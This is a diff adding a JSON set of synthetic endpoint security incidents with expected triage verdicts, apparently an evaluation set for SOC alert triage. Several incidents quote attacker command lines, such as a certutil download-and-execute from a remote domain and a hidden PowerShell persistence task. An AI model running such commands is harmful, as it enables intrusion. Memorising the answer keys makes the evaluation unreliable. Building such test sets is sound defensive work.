@@ -1,0 +1,288 @@
+{
+  "schema_version": 1,
+  "category": "endpoint",
+  "description": "Endpoint / EDR incidents. Several false positives are deliberately built from techniques that are genuinely malicious in other contexts (PsExec, unsigned binaries, EICAR, LOLBins) but are here explained by documented IT and security-team activity.",
+  "incidents": [
+    {
+      "expected": {
+        "verdict": "TRUE_POSITIVE",
+        "techniques": ["T1055", "T1071.001"],
+        "severity": "High",
+        "rationale": "Process injection into a browser followed by fixed-interval beaconing with jitter to a newly registered domain is C2 implant behaviour."
+      },
+      "incident": {
+        "id": "ep-001",
+        "incidentNumber": 3001,
+        "title": "Process Injection into Browser with Periodic Beaconing",
+        "description": "rundll32.exe injected a thread into msedge.exe on WKS-DEV-041. The browser process then initiated outbound HTTPS to cdn-telemetry-sync.net every 58-64 seconds with consistent 812-byte payloads. The domain was registered 6 days ago behind privacy protection. No corresponding user browsing activity accompanied the connections, including outside working hours.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["DefenseEvasion", "CommandAndControl"],
+        "techniques": ["T1055", "T1071.001"],
+        "alertsCount": 3,
+        "alerts": [{"id": "a-3001", "title": "Process injection detected", "description": "Remote thread created in a browser process by rundll32.exe.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["DefenseEvasion"], "techniques": ["T1055"]}],
+        "entities": [
+          {"kind": "Host", "name": "WKS-DEV-041", "os": "Windows 11 Enterprise"},
+          {"kind": "Account", "name": "eross@cybersecurity.corp", "upn": "eross@cybersecurity.corp"},
+          {"kind": "Ip", "address": "185.244.25.171", "direction": "Outbound", "location": "Seychelles"},
+          {"kind": "Process", "processName": "rundll32.exe", "commandLine": "rundll32.exe C:\\Users\\Public\\upd.dat,DllRegisterServer"}
+        ],
+        "labels": ["C2", "ProcessInjection"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "TRUE_POSITIVE",
+        "techniques": ["T1053.005", "T1059.001"],
+        "severity": "High",
+        "rationale": "Scheduled task created under a misleading Microsoft-like name running an obfuscated script from AppData at every logon is persistence."
+      },
+      "incident": {
+        "id": "ep-002",
+        "incidentNumber": 3002,
+        "title": "Scheduled Task Persistence with Masquerading Name",
+        "description": "A scheduled task named 'MicrosoftEdgeUpdateTaskMachineUA' was created on SRV-APP-12 running powershell.exe -w hidden -ep bypass against a script in C:\\Users\\svc_app\\AppData\\Roaming\\. The genuine Edge updater task of a similar name already exists at a different path and was untouched. The script is obfuscated with string concatenation and base64. Task was created by a process whose parent was a w3wp.exe worker process, suggesting web-shell origin.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["Persistence", "Execution", "DefenseEvasion"],
+        "techniques": ["T1053.005", "T1059.001", "T1036.005"],
+        "alertsCount": 2,
+        "alerts": [{"id": "a-3002", "title": "Suspicious scheduled task created", "description": "Task masquerading as a Microsoft component executing a hidden script.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["Persistence"], "techniques": ["T1053.005"]}],
+        "entities": [
+          {"kind": "Host", "name": "SRV-APP-12", "os": "Windows Server 2022"},
+          {"kind": "Account", "name": "svc_app@cybersecurity.corp", "upn": "svc_app@cybersecurity.corp"},
+          {"kind": "Process", "processName": "schtasks.exe", "commandLine": "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineUA /tr \"powershell -w hidden -ep bypass -f C:\\Users\\svc_app\\AppData\\Roaming\\u.ps1\" /sc onlogon"}
+        ],
+        "labels": ["Persistence", "Masquerading"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "TRUE_POSITIVE",
+        "techniques": ["T1562.001", "T1068"],
+        "severity": "High",
+        "rationale": "A known-vulnerable signed driver loaded immediately before EDR sensor termination is bring-your-own-vulnerable-driver used to disable defences."
+      },
+      "incident": {
+        "id": "ep-003",
+        "incidentNumber": 3003,
+        "title": "Vulnerable Signed Driver Loaded Prior to Security Sensor Termination",
+        "description": "Driver gdrv.sys (Gigabyte, known CVE-2018-19320, present on the Microsoft vulnerable driver blocklist) was loaded on SRV-DB-03. Ninety seconds later the Defender sensor service terminated unexpectedly and telemetry from the host ceased for 22 minutes. The host is a database server with no Gigabyte hardware and no legitimate reason for this driver. Installing process ran from C:\\Windows\\Temp\\.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["DefenseEvasion", "PrivilegeEscalation"],
+        "techniques": ["T1562.001", "T1068"],
+        "alertsCount": 3,
+        "alerts": [{"id": "a-3003", "title": "Vulnerable driver loaded", "description": "Driver matching the vulnerable driver blocklist was loaded.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["PrivilegeEscalation"], "techniques": ["T1068"]}],
+        "entities": [
+          {"kind": "Host", "name": "SRV-DB-03", "os": "Windows Server 2022"},
+          {"kind": "Process", "processName": "gdrv.sys", "commandLine": "C:\\Windows\\Temp\\gdrv.sys"}
+        ],
+        "labels": ["BYOVD", "DefenseEvasion"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "TRUE_POSITIVE",
+        "techniques": ["T1218.011", "T1105"],
+        "severity": "High",
+        "rationale": "LOLBin download-and-execute chain from a paste site with the payload written to a temp directory and immediately run."
+      },
+      "incident": {
+        "id": "ep-004",
+        "incidentNumber": 3004,
+        "title": "Living-off-the-Land Download and Execute via certutil",
+        "description": "certutil.exe -urlcache -split -f was used on LAP-HR-207 to retrieve a file from hxxps://paste-bin-cdn[.]top/r/9fk2 into C:\\Users\\Public\\svc.exe, which was executed 3 seconds later and immediately spawned cmd.exe running whoami and net group 'domain admins'. The user is an HR coordinator with no scripting or administrative duties. The destination domain has no threat-intel history but was registered 11 days ago.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["Execution", "CommandAndControl", "Discovery"],
+        "techniques": ["T1218.011", "T1105", "T1087.002"],
+        "alertsCount": 3,
+        "alerts": [{"id": "a-3004", "title": "Suspicious certutil usage", "description": "certutil used to download a remote file.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["CommandAndControl"], "techniques": ["T1105"]}],
+        "entities": [
+          {"kind": "Host", "name": "LAP-HR-207", "os": "Windows 11 Enterprise"},
+          {"kind": "Account", "name": "nabbas@cybersecurity.corp", "upn": "nabbas@cybersecurity.corp"},
+          {"kind": "Process", "processName": "certutil.exe", "commandLine": "certutil.exe -urlcache -split -f https://paste-bin-cdn.top/r/9fk2 C:\\Users\\Public\\svc.exe"}
+        ],
+        "labels": ["LOLBin", "Downloader"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "FALSE_POSITIVE",
+        "techniques": [],
+        "severity": "Informational",
+        "rationale": "EICAR test file deployed by the security team as a documented detection-validation exercise."
+      },
+      "incident": {
+        "id": "ep-005",
+        "incidentNumber": 3005,
+        "title": "Malware Detected on Multiple Endpoints Simultaneously",
+        "description": "Malware signature detected on 25 endpoints within 4 minutes. The detected file is the EICAR standard anti-malware test file, deployed by the security engineering team as part of documented detection-validation exercise SEC-TEST-2026-09 to verify EDR coverage after a sensor upgrade. Deployment was via the standard software distribution tool from the security team's own management server, and the exercise was announced to the SOC in advance.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["Execution"],
+        "techniques": ["T1204.002"],
+        "alertsCount": 25,
+        "alerts": [{"id": "a-3005", "title": "Malware detected", "description": "Known malware signature identified on endpoint.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["Execution"], "techniques": ["T1204.002"]}],
+        "entities": [
+          {"kind": "Host", "name": "WKS-VARIOUS", "os": "Windows 11 Enterprise"},
+          {"kind": "Account", "name": "svc_secops@cybersecurity.corp", "upn": "svc_secops@cybersecurity.corp"}
+        ],
+        "labels": ["EICAR", "DetectionValidation"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "FALSE_POSITIVE",
+        "techniques": [],
+        "severity": "Informational",
+        "rationale": "PsExec lateral execution is the documented software deployment tool run by IT operations under an approved change."
+      },
+      "incident": {
+        "id": "ep-006",
+        "incidentNumber": 3006,
+        "title": "PsExec Remote Execution Across 60 Workstations",
+        "description": "PsExec.exe executed remotely against 60 workstations from JMP-ITOPS-01 in a 20-minute window. Source host is the documented IT operations jump box, the executing identity svc_deploy is the software deployment service account, and change ticket CHG-2026-1203 authorises an out-of-band Adobe Reader security patch to exactly this device group. The executed command installs the vendor MSI from the internal software repository. The device list matches the change ticket scope precisely.",
+        "severity": "High",
+        "status": "New",
+        "tactics": ["Execution", "LateralMovement"],
+        "techniques": ["T1569.002"],
+        "alertsCount": 60,
+        "alerts": [{"id": "a-3006", "title": "PsExec lateral movement", "description": "Remote service execution observed across multiple hosts.", "severity": "High", "vendor": "Microsoft Defender for Endpoint", "tactics": ["LateralMovement"], "techniques": ["T1569.002"]}],
+        "entities": [
+          {"kind": "Host", "name": "JMP-ITOPS-01", "os": "Windows Server 2022"},
+          {"kind": "Account", "name": "svc_deploy@cybersecurity.corp", "upn": "svc_deploy@cybersecurity.corp"},
+          {"kind": "Process", "processName": "PsExec.exe", "commandLine": "PsExec.exe \\\\WKS-* -s msiexec /i \\\\repo\\sw\\AcroRdr_2026.msi /qn"}
+        ],
+        "labels": ["ITOps", "ApprovedChange"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "FALSE_POSITIVE",
+        "techniques": [],
+        "severity": "Informational",
+        "rationale": "Unsigned binary execution from a developer's build output directory on a machine in the developer workstation group - expected behaviour for this role."
+      },
+      "incident": {
+        "id": "ep-007",
+        "incidentNumber": 3007,
+        "title": "Unsigned Binary Execution from User Directory",
+        "description": "An unsigned executable ran from C:\\Users\\kbrennan\\source\\repos\\PaymentService\\bin\\Debug\\net8.0\\PaymentService.exe on LAP-DEV-118. The host is a member of the Developer Workstations group with a documented EDR exclusion policy for build output paths. The binary was produced by dotnet build 40 seconds earlier by the logged-on developer, the file path matches an active internal Git repository, and the process made only localhost connections to a debug port. The user is a software engineer on the payments team.",
+        "severity": "Medium",
+        "status": "New",
+        "tactics": ["Execution"],
+        "techniques": ["T1204.002"],
+        "alertsCount": 1,
+        "alerts": [{"id": "a-3007", "title": "Unsigned binary executed", "description": "Executable without a valid signature was run.", "severity": "Medium", "vendor": "Microsoft Defender for Endpoint", "tactics": ["Execution"], "techniques": ["T1204.002"]}],
+        "entities": [
+          {"kind": "Host", "name": "LAP-DEV-118", "os": "Windows 11 Enterprise"},
+          {"kind": "Account", "name": "kbrennan@cybersecurity.corp", "upn": "kbrennan@cybersecurity.corp"},
+          {"kind": "Process", "processName": "PaymentService.exe", "commandLine": "C:\\Users\\kbrennan\\source\\repos\\PaymentService\\bin\\Debug\\net8.0\\PaymentService.exe"}
+        ],
+        "labels": ["DeveloperWorkstation", "BuildOutput"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "FALSE_POSITIVE",
+        "techniques": [],
+        "severity": "Informational",
+        "rationale": "Registry run-key additions are the documented endpoint agent rollout from the management server under change control."
+      },
+      "incident": {
+        "id": "ep-008",
+        "incidentNumber": 3008,
+        "title": "Registry Run Key Modification Across Fleet",
+        "description": "Registry Run key additions detected on 310 endpoints over 2 hours. The added value launches C:\\Program Files\\Corp\\AssetAgent\\agent.exe, a code-signed binary from the organisation's asset-management vendor. The rollout originated from the Intune management plane under change ticket CHG-2026-1210 for asset-inventory agent v4.2, and the affected device count matches the targeted device group exactly. The vendor certificate chain is valid and the binary hash matches the vendor's published release.",
+        "severity": "Medium",
+        "status": "New",
+        "tactics": ["Persistence"],
+        "techniques": ["T1547.001"],
+        "alertsCount": 310,
+        "alerts": [{"id": "a-3008", "title": "Autostart registry modification", "description": "Run key modified to launch a binary at logon.", "severity": "Medium", "vendor": "Microsoft Defender for Endpoint", "tactics": ["Persistence"], "techniques": ["T1547.001"]}],
+        "entities": [
+          {"kind": "Host", "name": "WKS-FLEET", "os": "Windows 11 Enterprise"},
+          {"kind": "Process", "processName": "agent.exe", "commandLine": "C:\\Program Files\\Corp\\AssetAgent\\agent.exe"}
+        ],
+        "labels": ["Intune", "ApprovedChange"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "SUSPICIOUS_ESCALATE",
+        "techniques": ["T1219"],
+        "severity": "Medium",
+        "rationale": "Remote access tool installed without a ticket. Could be shadow IT or an attacker's remote access - the incident provides no evidence to distinguish."
+      },
+      "incident": {
+        "id": "ep-009",
+        "incidentNumber": 3009,
+        "title": "Remote Access Tool Installed on Workstation",
+        "description": "AnyDesk was installed and run on WKS-FIN-220 by the logged-on user, who has local administrator rights granted under a legacy exception. One inbound session of 18 minutes originated from an IP in the same city as the user's home address. No help desk ticket references remote support for this machine, and the organisation's standard remote support tool is a different product. The user has not been contacted. Neither malicious use nor legitimate self-support can be established from the available evidence.",
+        "severity": "Medium",
+        "status": "New",
+        "tactics": ["CommandAndControl"],
+        "techniques": ["T1219"],
+        "alertsCount": 1,
+        "alerts": [{"id": "a-3009", "title": "Remote access software detected", "description": "Unapproved remote access utility installed and used.", "severity": "Medium", "vendor": "Microsoft Defender for Endpoint", "tactics": ["CommandAndControl"], "techniques": ["T1219"]}],
+        "entities": [
+          {"kind": "Host", "name": "WKS-FIN-220", "os": "Windows 11 Enterprise"},
+          {"kind": "Account", "name": "dpatel@cybersecurity.corp", "upn": "dpatel@cybersecurity.corp"},
+          {"kind": "Ip", "address": "82.44.19.77", "direction": "Inbound", "location": "Leeds, UK"}
+        ],
+        "labels": ["RemoteAccessTool", "ShadowIT"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "SUSPICIOUS_ESCALATE",
+        "techniques": ["T1027"],
+        "severity": "Medium",
+        "rationale": "Obfuscated script in a temp directory with no execution evidence and no network activity - needs analysis before a verdict can be reached."
+      },
+      "incident": {
+        "id": "ep-010",
+        "incidentNumber": 3010,
+        "title": "Obfuscated Script File Written to Temp Directory",
+        "description": "A heavily obfuscated VBScript was written to C:\\Windows\\Temp\\ on SRV-PRINT-02. The file was never executed, made no network connections and was removed 6 hours later by the scheduled temp cleanup task. The writing process could not be attributed because the relevant telemetry had aged out of the retention window. The host runs a legacy print management suite known to generate machine-written scripts, though none previously matched this pattern. No other indicators on the host.",
+        "severity": "Medium",
+        "status": "New",
+        "tactics": ["DefenseEvasion"],
+        "techniques": ["T1027"],
+        "alertsCount": 1,
+        "alerts": [{"id": "a-3010", "title": "Obfuscated file detected", "description": "File with high entropy and obfuscation indicators written to disk.", "severity": "Medium", "vendor": "Microsoft Defender for Endpoint", "tactics": ["DefenseEvasion"], "techniques": ["T1027"]}],
+        "entities": [
+          {"kind": "Host", "name": "SRV-PRINT-02", "os": "Windows Server 2019"}
+        ],
+        "labels": ["ObfuscatedFile", "NeedsAnalysis"]
+      }
+    },
+    {
+      "expected": {
+        "verdict": "BENIGN",
+        "techniques": [],
+        "severity": "Informational",
+        "rationale": "Crash-handler process spawning behaviour from a known-buggy application version. Real detection, real activity, no adversary and no security relevance."
+      },
+      "incident": {
+        "id": "ep-011",
+        "incidentNumber": 3011,
+        "title": "Unusual Child Process Spawned by Line-of-Business Application",
+        "description": "The ERP client spawned werfault.exe and dumped process memory repeatedly on 14 workstations. Vendor release notes for the currently deployed version document a known crash defect triggered by a specific report template, with a hotfix scheduled. The spawning pattern matches the vendor's description exactly, occurs only when that report is opened, and involves no network activity, no file writes outside the crash dump path and no credential access. IT has an open vendor support case.",
+        "severity": "Low",
+        "status": "New",
+        "tactics": [],
+        "techniques": [],
+        "alertsCount": 14,
+        "alerts": [{"id": "a-3011", "title": "Anomalous process tree", "description": "Application spawning unexpected child processes.", "severity": "Low", "vendor": "Microsoft Defender for Endpoint", "tactics": [], "techniques": []}],
+        "entities": [
+          {"kind": "Host", "name": "WKS-OPS-VARIOUS", "os": "Windows 11 Enterprise"},
+          {"kind": "Process", "processName": "werfault.exe", "commandLine": "werfault.exe -p 4412 -s 1024"}
+        ],
+        "labels": ["ApplicationCrash", "VendorKnownIssue"]
+      }
+    }
+  ]
+}
